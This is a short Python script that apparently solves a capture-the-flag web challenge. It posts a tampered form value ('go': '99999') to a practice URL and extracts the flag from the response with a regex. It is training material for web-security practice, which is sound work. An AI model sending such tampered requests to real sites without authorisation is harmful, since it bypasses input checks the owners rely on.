#!/usr/bin/python

import pycurl, StringIO, certifi
from urllib import urlencode
import re

url = 'https://ctfs.me/web/web30/'

c = pycurl.Curl()
c.setopt(pycurl.USERAGENT, 'Mozilla/5.0')
c.setopt(pycurl.CAINFO, certifi.where())
c.setopt(pycurl.URL, url)
b = StringIO.StringIO()
c.setopt(pycurl.WRITEFUNCTION, b.write)
c.setopt(pycurl.FOLLOWLOCATION, 1)
c.setopt(pycurl.MAXREDIRS, 5)

post_data = {'go': '99999'}
postfields = urlencode(post_data)

c.setopt(c.POSTFIELDS, postfields)
c.perform()

body = b.getvalue()
flag = re.search('CTFS\{.+\}', body, re.I|re.M)

print '[+] Flag is: ' + flag.group()